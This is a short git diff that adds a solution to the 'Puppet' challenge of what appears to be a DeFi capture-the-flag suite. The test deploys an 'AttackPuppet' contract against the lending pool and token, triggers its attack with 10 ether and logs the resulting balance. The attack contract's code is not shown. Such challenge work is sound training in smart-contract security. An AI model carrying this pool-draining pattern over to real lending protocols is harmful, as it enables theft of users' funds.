@@ -113,6 +113,18 @@ describe("[Challenge] Puppet", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    const attackContractFactory = await ethers.getContractFactory(
+      "AttackPuppet",
+      deployer
+    );
+    const attackContract = await attackContractFactory.deploy(
+      lendingPool.address,
+      token.address
+    );
+    attackContract.connect(player);
+    await attackContract.attack(2, { value: ethers.utils.parseEther("10") });
+    const balance = await attackContract.getBalance();
+    console.log(balance);
   });
 
   after(async function () {
